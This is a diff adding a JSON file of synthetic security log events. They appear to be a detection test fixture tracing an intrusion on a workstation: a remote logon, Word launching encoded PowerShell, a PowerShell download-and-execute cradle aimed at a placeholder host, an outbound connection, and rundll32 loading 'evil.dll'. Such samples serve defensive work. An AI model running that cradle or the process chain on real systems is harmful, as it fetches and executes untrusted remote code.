@@ -1,0 +1,82 @@
+[
+  {
+    "timestamp": "2026-06-08T02:14:01.612845+00:00",
+    "host": "WS-07",
+    "user": "ACME\\jdoe",
+    "event": {
+      "category": [
+        "authentication"
+      ]
+    },
+    "LogonType": "10",
+    "IpAddress": "185.220.101.5"
+  },
+  {
+    "timestamp": "2026-06-08T02:14:21.612845+00:00",
+    "host": "WS-07",
+    "user": "ACME\\jdoe",
+    "event": {
+      "category": [
+        "process"
+      ]
+    },
+    "process": {
+      "name": "powershell.exe",
+      "parent": {
+        "name": "winword.exe"
+      },
+      "command_line": "powershell -enc ZQB2AGkAbAA="
+    }
+  },
+  {
+    "timestamp": "2026-06-08T02:14:26.612845+00:00",
+    "host": "WS-07",
+    "user": "ACME\\jdoe",
+    "event": {
+      "category": [
+        "process"
+      ]
+    },
+    "process": {
+      "name": "powershell.exe",
+      "parent": {
+        "name": "winword.exe"
+      },
+      "command_line": "powershell IEX(New-Object Net.WebClient).DownloadString('http://x')"
+    }
+  },
+  {
+    "timestamp": "2026-06-08T02:14:41.612845+00:00",
+    "host": "WS-07",
+    "user": "ACME\\jdoe",
+    "event": {
+      "category": [
+        "network"
+      ]
+    },
+    "destination": {
+      "ip": "185.220.101.5",
+      "port": 443
+    },
+    "process": {
+      "name": "powershell.exe"
+    }
+  },
+  {
+    "timestamp": "2026-06-08T02:15:31.612845+00:00",
+    "host": "WS-07",
+    "user": "ACME\\jdoe",
+    "event": {
+      "category": [
+        "process"
+      ]
+    },
+    "process": {
+      "name": "rundll32.exe",
+      "parent": {
+        "name": "powershell.exe"
+      },
+      "command_line": "rundll32 evil.dll,Start"
+    }
+  }
+]
